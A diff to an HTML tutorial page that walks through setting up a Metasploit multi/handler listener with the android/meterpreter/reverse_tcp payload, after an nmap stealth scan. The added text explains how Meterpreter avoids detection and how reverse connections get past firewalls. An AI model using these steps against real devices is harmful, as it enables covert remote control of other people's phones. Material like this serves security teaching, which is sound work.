@@ -95,6 +95,10 @@
                         <p><b style="color: red;">DISCLAIMER:</b> DO NOT TRY THIS AT HOME OR ON PUBLIC NETWORKS!</p>
                         <p><img src="assets/img/ww.gif" class="img-fluid mx-auto d-block" alt="ww"/></p>
                         <h4>Step 1:</h4>
+                        <p>Run the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: #ccc; border-radius: 6px; color: black;">nmap</code> command as shown below</p>
+                        <p></p>
+                        <pre><code data-language="shell">nmap -sS</code></pre>
+                        <p><code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: #ccc; border-radius: 6px; color: black;">nmap</code> is a Security Scanner that allows us to scan networks with different options. The flags denoted by <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: #ccc; border-radius: 6px; color: black;">-sS</code> are the most common and initiate a stealthier scan of the network.</p>
                         <p>Fire up the Metasploit console by running this command on your Kali Linux VM's terminal</p>
                         <pre><code data-language="shell">msfconsole</code></pre>
                         <p>Your terminal should now look something like this</p>
@@ -102,14 +106,19 @@
                         <h4>Step 2:</h4>
                         <p>Your terminal should have "msf6" as its prompt now. This means you can begin to use Metasploit commands. Type the command below.</p>
                         <pre><code data-language="shell">msf6> use exploit/multi/handler</code></pre>
-                        <p>This command </p>
+                        <p>The Multi Handler command launches a stub that runs outside the Framework. This command launches a payload that is specific to our specification.</p>
                         <p><img src="assets/post1pics/msf2.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
                         <h4>Step 3:</h4>
                         <pre><code data-language="shell">msf6> search android/meterpreter</code></pre>
+                        <p>Meterpreter is a tool that is part of the Metasploit Framework which allows you to take advantage of, as well as, find vulnerabilities in a system. This penetration testing tool can easily take hold of victim's resources as needed. Meterpreter utilises an in-memory injection which writes nothing to disk. This allows for the exploit to run without being detected by normal means. A new process is not created, rather it injects itself into a compromised process. For this reason also the forensic footprint left behind by the Meterpreter is extremly limited.</p>
                         <h4>Step 4:</h4>
                         <pre><code data-language="shell">msf6> set payload android/meterpreter/reverse_tcp</code></pre>
+                        <p>When the host initiates a connection, that is called a <i>forward connection</i>. However, when the opposite is done, a server initiates the connection to a host, then it is called a <i>reverse connection</i></p>
+                        <p>Firewalls work on the basic principle of blocking all incoming connection. So all incoming connections (reverse connections) are blocked by the firewall. However, if a host initiates a connection (forward connection) it is allowed and the return for the connection initiated by the host will be permitted.</p>
+                        <p><code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: #ccc; border-radius: 6px; color: black;">reverse_tcp</code> is basically instead of the attacker initiating the connection which will obviously blocked by the firewall instead, the device initiates the connection to the attacker, which will be allowed by the firewall and the attacker then take control of the device and pass commands. It is a type of reverse shell.</p>
                         <h4>Step 5:</h4>
                         <pre><code data-language="shell">msf6> show options</code></pre>
+                        <p>The above command shows the current options for the payload. These can then be changed as shown below.</p>
                         <h4>Step 6:</h4>
                         <pre><code data-language="shell">msf6> set LHOST ip_address</code></pre>
                         <h4>Step 7:</h4>
